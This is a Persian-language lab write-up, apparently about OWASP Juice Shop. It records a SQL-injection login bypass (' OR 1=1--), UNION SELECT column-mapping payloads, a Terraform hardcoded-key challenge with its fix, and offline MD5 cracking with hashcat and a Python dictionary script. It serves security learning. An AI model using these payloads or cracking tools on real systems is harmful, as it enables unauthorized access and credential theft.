Authentication Bypass — Login Form SQLi
CONFIRMED

فرضیه و پیلود اولیه

فرض بر این بود که مقدار فیلد email بدون sanitize مستقیم داخل query دیتابیس قرار می‌گیرد. پیلود کلاسیک تست شد:

' OR 1=1--

نتیجه

درخواست POST /rest/user/login با این مقدار در فیلد ایمیل (و یک پسورد دلخواه)، پاسخ 200 OK همراه با یک JWT معتبر بازگرداند و ورود به پنل با نقش admin انجام شد.

نتیجه‌گیری: شرط 1=1 همیشه true است، پس کل شرط WHERE نادیده گرفته شده و اولین رکورد دیتابیس (کاربر admin) بازگردانده شد. SQLi Boolean-based روی فرم لاگین تأیید شد.

نگاشت ستون‌ها با UNION SELECT — روش تک‌ستونی

Column Mapping via Isolated UNION Tests
METHOD

تلاش‌های اولیه و اشتباه روش‌شناختی

اولین تلاش‌ها با تغییر همزمان چند ستون انجام شد (مثلاً چند ستون اول همگی 'x') که باعث شد نتیجه‌ها (2FA prompt یا Invalid) قابل تفکیک نباشند و یک فرضیه‌ی غلط («ستون ۱ = totpSecret») به‌طور موقت شکل بگیرد.

درس گرفته‌شده: در نگاشت ستون‌ها باید هر بار فقط یک ستون تغییر کند؛ در غیر این‌صورت اثر هر ستون قابل تفکیک از بقیه نیست.

روش اصلاح‌شده — تست تک‌ستونی

' UNION SELECT 1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--   →  2FA prompt
' UNION SELECT NULL,1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--   →  Invalid
' UNION SELECT NULL,NULL,NULL,...(ستون‌های ۳ تا ۱۳ تنها)...--                    →  همه Invalid

الگوی نهایی: هر وقت ستون ۱ غیر NULL بود، اپلیکیشن به سراغ 2FA می‌رفت (چون رکورد کاربر معتبر ساخته می‌شد)؛ وقتی ستون ۱ برابر NULL بود، رکورد از اساس نامعتبر تشخیص داده می‌شد. این تأیید کرد ستون ۱ همان id (کلید اصلی) است، نه totpSecret.

چالش جانبی: کلید خصوصی هاردکد‌شده در Terraform

Coding Challenge — iacLeakedKeyChallenge
SOLVED

شرح چالش

در بخش Coding Challenge: Login Cloud Admin، یک قطعه کد Terraform (IaC) بررسی شد که در آن مقدار خام private_key (کلید RSA کامل، شروع‌شونده با -----BEGIN RSA PRIVATE KEY-----) مستقیم داخل فایل .tf نوشته شده بود، به‌جای خوانده‌شدن از فایل جداگانه.

Find It — تشخیص آسیب‌پذیری

خط آسیب‌پذیر شناسایی شد:

resource "aws_iam_server_certificate" "juice_shop_tls" {
  name             = "${var.project_name}-tls-cert"
  certificate_body = file("${path.module}/certs/server.crt")
  private_key      = "-----BEGIN RSA PRIVATE KEY-----\nMIIC..."   ← هاردکد شده
}

Fix It — انتخاب راه‌حل درست

Fix 2 به‌عنوان راه‌حل صحیح انتخاب و تأیید شد:

private_key = file("${path.module}/certs/server.key")
نتیجه‌گیری: خواندن کلید از یک فایل جدا (که خارج از version control و در .gitignore نگه داشته می‌شود) از افشای کلید در تاریخچه‌ی Git جلوگیری می‌کند. این چالش نسخه‌ی مفهومیِ همان سناریوی واقعی «پیدا کردن private key از طریق نفوذ به فایل‌های سرور» است.

کرک کردن هش‌های MD5 استخراج‌شده

Offline Password Cracking — hashcat & Python fallback
4 / 24 CRACKED

تلاش اول — hashcat روی GPU/OpenCL

hashcat -m 0 -a 0 hashes.txt rockyou.txt

خطای اولیه: مسیر rockyou.txt نادرست بود (نصب نشده یا هنوز gzip بود). حتی بعد از رفع مسیر و اجرای مجدد با -D 1 -w 1، خطای زیر مانع اجرا شد:

Not enough allocatable device memory or free host memory for mapping.

تشخیص علت

بررسی با hashcat -I نشان داد سخت‌افزار سیستم (Intel Celeron N2840، تک‌هسته مؤثر، بلاک حافظه‌ی قابل‌تخصیص محدود به 256 MB) حتی برای یک حمله‌ی brute-force ساده‌ی ۶ رقمی هم کافی نبود — یک محدودیت واقعی سخت‌افزاری بود، نه مشکل تنظیمات.

راه‌حل جایگزین — اسکریپت Python (CPU-only, بدون OpenCL)

import hashlib

with open('hashes.txt') as f:
    hashes = set(line.strip() for line in f)

found = {}
with open('/usr/share/wordlists/rockyou.txt', encoding='latin-1') as f:
    for word in f:
        word = word.strip()
        h = hashlib.md5(word.encode()).hexdigest()
        if h in hashes:
            found[h] = word
            print(f"[+] {h} = {word}")
        if len(found) == len(hashes):
            break

این اسکریپت به‌صورت دستی (بدون نیاز به GPU/OpenCL) هر پسورد داخل rockyou.txt را با MD5 هش کرده و با لیست هش‌های هدف مقایسه می‌کند — همان اصل dictionary attack که hashcat انجام می‌دهد، فقط با سرعت کمتر روی CPU.
